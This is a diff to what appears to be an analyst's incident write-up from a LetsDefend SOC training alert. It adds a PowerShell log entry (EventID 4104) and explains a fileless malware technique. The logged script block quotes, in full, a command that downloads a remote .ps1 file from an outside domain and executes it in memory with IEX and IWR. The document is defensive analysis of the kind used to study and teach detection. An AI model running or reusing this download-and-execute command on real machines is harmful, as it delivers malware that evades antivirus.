@@ -154,3 +154,18 @@ Status    : NOT Contained
 > was executed. The malware first checked and bypassed 
 > the PowerShell ExecutionPolicy security restriction 
 > before running — a deliberate evasion technique.
+
+#### Log 2 — Remote Command Execution (EventID 4104)
+| Field | Value |
+|---|---|
+| **EventID** | 4104 (Execute a Remote Command) |
+| **Username** | LetsDefend |
+| **PID** | 6968 |
+| **Script Block** | cmd.exe /c "powershell -command IEX(IWR -UseBasicParsing 'https://kionagranada.com/upload/sd2.ps1')" |
+
+> The malware used IEX (Invoke-Expression) combined 
+> with IWR (Invoke-WebRequest) to download and execute 
+> sd2.ps1 directly in memory without saving to disk.
+> This is a Fileless Malware technique designed to 
+> evade antivirus tools that scan files on disk.
+
